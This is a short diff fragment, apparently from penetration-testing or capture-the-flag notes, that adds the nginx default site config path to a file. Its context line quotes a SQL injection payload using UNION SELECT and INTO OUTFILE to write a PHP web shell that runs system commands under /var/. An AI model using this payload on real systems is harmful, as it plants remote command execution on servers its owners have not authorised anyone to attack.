@@ -107,3 +107,5 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 
 
 ***
+
+/etc/nginx//sites-enabled/default
